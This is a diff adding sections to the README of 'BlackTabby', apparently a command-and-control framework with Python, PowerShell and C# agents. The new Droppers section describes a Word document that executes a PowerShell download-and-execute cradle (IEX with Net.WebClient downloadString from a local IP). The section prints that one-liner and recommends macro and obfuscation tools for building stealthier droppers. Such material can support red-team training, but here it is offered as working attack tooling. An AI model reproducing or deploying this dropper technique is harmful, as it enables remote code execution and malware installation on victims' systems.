@@ -32,6 +32,17 @@ python3 BlackTabby.py
 ```
 You will be asked for the credentials provided as well as the ip address and port that the CouchDB container is running on which should be 127.0.0.1 5984 unless you set this up to run on a different server that the CLI interface will be running on. This will create a view in CouchDB that is neccesary for the CLI to function properly.
 
+## Agents
+So far the only agents that can be created through the CLI are python and powershell, i wrote a C# agent that has my loopback hardcoded, as well as the agent secrets if this is edited to suite anyones needs then it can also be used.
+
+## Droppers
+In the DropperStuff folder i was able to create word doc that ran the following code as a way of executing the powershell agent.
+
+```
+IEX(New-Object Net.WebClient).downloadString('http://10.0.0.150/Agent.ps1') 
+```
+I came across [MacroPack](https://github.com/sevagas/macro_pack) which creates and obfuscates dropper files for you go ahead and check it out is pretty awesome. That in conjunction with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) is a great combo.
+
 ## Creating Agents
 
 There is an option on the CLI that allows you to create agents, it will ask you for the ip address and port it will be connecting to. In this case you do not enter the port 5984 which is CouchDB you would enter 9000 which is the flask server.
@@ -51,6 +62,9 @@ export_json /tmp/json_output.txt
 ```
 
 ![](https://github.com/latortuga71/Black_Tabby/blob/master/setup3.JPG)
+
+## 
+
 
 ## Built With
 
